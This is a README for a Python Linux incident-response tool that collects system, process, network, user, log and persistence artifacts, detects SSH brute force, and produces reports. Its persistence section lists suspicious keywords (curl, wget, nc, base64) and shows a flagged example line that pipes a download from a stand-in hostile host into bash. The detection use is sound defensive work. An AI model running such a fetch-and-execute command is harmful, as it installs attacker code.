# linux-ir-collector

A lightweight Linux Incident Response collector written in Python. Designed to be run on a potentially compromised system to gather forensic artifacts, detect common attack patterns, and generate structured reports .

---

## Features

- 6 specialized collectors - system info, processes, network, users, logs, persistence
- OOP architecture - each collector extends BaseCollector
- SSH brute-force detection - extracts attacker IPs and counts login attempts
- Persistence mechanism detection - scans cron jobs, systemd units, and autostart entries
- Severity scoring - rates findings as LOW / MEDIUM / HIGH / CRITICAL
- Timeline view - chronological list of events extracted from logs
- Dual report output - Markdown (report.md) and machine-readable JSON (report.json)
- Artifact integrity - SHA-256 checksums for all collected files (checksums.sha256)
- Timestamped output directory - each run produces an isolated snapshot
- Web UI - browser-based report viewer with history, SSH stats, persistence view, and timeline

---

## Requirements

#### Core collector
- Linux (Debian/Ubuntu or RHEL/Fedora)
- Python 3.8+
- Root privileges (sudo)
#### Web UI
- Python: fastapi, uvicorn
- Node.js 18+ and npm

---

## Installation

```bash
git clone https://github.com/mh00909/linux-ir-collector.git
cd linux-ir-collector
```
### Install Web UI dependencies
```
# Backend
pip install fastapi uvicorn --break-system-packages

# Frontend
cd web/frontend
npm install
```

---

## Usage

```bash
sudo python3 -m ir_collector.main
```
> Root is required to read protected files such as `/etc/shadow`, `/var/log/auth.log`, and network socket information.

#### Options
```
--output, -o    Output directory (default: report_YYYY-mm-dd_HHMMSS)
--no-report     Collect raw artifacts only, skip report generation
```

After completion, a timestamped directory is created in the current working directory:

```
ir_report_2026-03-07_14-22-01/
```
### Start the Web UI
### Backend
```
cd web/backend
uvicorn app:app --reload
```
### Frontend
```
cd web/frontend
npm run dev
```


---

## Collectors

### 1. System
Collects baseline system information for host identification.

Commands: `uname -a`, `uptime`, `date`, `hostnamectl`

### 2. Processes
Captures all running processes and failed systemd units to identify malware, cryptominers, or unauthorized services.

Commands: `ps auxww`, `top -b -n 1`, `systemctl --failed`

### 3. Network
Records network interfaces, routing tables, and listening sockets to detect backdoors and unexpected open ports.

Commands: `ip a`, `ip route`, `ss -tulnp`

### 4. Users
Copies user and group databases for account enumeration and detection of accounts created by malware.

Files: `/etc/passwd`, `/etc/group`, `/etc/shadow`

### 5. Logs
Parses authentication logs to detect SSH brute-force attacks. Extracts source IPs and counts failed login attempts per host.

Files: `/var/log/auth.log`, `/var/log/secure`

Detection pattern:
```
Failed password for <user> from <IP>
```

### 6. Persistence
Scans cron jobs and systemd unit files for commands commonly used to maintain malware persistence.

Suspicious keywords: `curl`, `wget`, `bash`, `nc`, `/tmp`, `base64`

Example of a flagged entry:
```
curl http://evil.sh | bash
```

---
### Severity levels:

| Level    | Meaning                                      |
|----------|----------------------------------------------|
| LOW      | Informational findings, no immediate threat  |
| MEDIUM   | Suspicious activity requiring investigation  |
| HIGH     | Strong indicators of compromise              |
| CRITICAL | Active attack or confirmed system compromise |

---

## Web UI
The browser-based UI reads report.json from each run directory and presents findings in four tabs:
- Overview - severity level, generated timestamp, list of reasons
- SSH - failed login count, unique source IPs, top attacker table
- Persistence - enabled services, timers, suspicious cron entries
- Timeline - chronological event log extracted from auth logs

### Stack
- Backend: FastAPI, served on localhost:8000
- Frontend: React 18, Vite 7, Tailwind CSS v4
### Screenshots
<img width="1837" height="707" alt="im1" src="https://github.com/user-attachments/assets/7579cce0-1f8d-4e9e-bf78-05bdd1548509" />
<img width="1837" height="707" alt="im2" src="https://github.com/user-attachments/assets/676efc71-3a36-4bbc-9d85-109ec7085e99" />


---
## Typical Incident Response Workflow
```
# 1. Suspected breach - run the collector
sudo python3 -m ir_collector.main

# 2. Quick review in terminal
less report_<timestamp>/report.md

# 3. Open Web UI for full analysis
cd web/backend && uvicorn app:app --reload &
cd web/frontend && npm run dev
```
